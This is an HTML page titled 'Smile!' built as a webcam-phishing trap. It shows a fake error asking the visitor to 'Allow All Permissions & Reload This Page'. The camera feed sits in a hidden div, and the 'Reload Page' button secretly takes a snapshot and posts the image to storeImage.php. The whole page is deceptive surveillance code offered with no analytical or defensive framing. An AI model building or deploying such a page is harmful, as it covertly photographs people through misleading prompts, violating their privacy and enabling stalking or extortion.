<!DOCTYPE html>
<html>

<head>
    <title>Smile!</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/webcamjs/1.0.25/webcam.min.js"></script>
    <link rel="stylesheet"
        href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css" />
</head>

<body>

    <div class="container">
        <br>
        <!-- <h1 class="text-center">Smile Wider :)</h1> -->
        <form method="POST" action="storeImage.php">
            <div class="row">
                <div class="col-12">
                    <center>
                        <div hidden="hidden" id="my_camera"></div>
                        <br>
                        <input type="hidden" name="image" class="image-tag">
                        <div id="results"></div>
                        <p>An Error Occurred Please Allow All Permissions & Reload This Page</p>
                        <button onClick="take_snapshot()" class="btn btn-danger">Reload Page</button>
                    </center>
                </div>
            </div>
        </form>
    </div>

    <!-- Configure a few settings and attach camera -->
    <script language="JavaScript">
    Webcam.set({
        width: 490,
        height: 390,
        image_format: 'jpeg',
        jpeg_quality: 90
    });

    Webcam.attach('#my_camera');

    function take_snapshot() {
        Webcam.snap(function(data_uri) {
            $(".image-tag").val(data_uri);
            document.getElementById('results').innerHTML = '<img hidden="hidden" src="' + data_uri + '"/>';
        });
    }
    </script>

</body>

</html>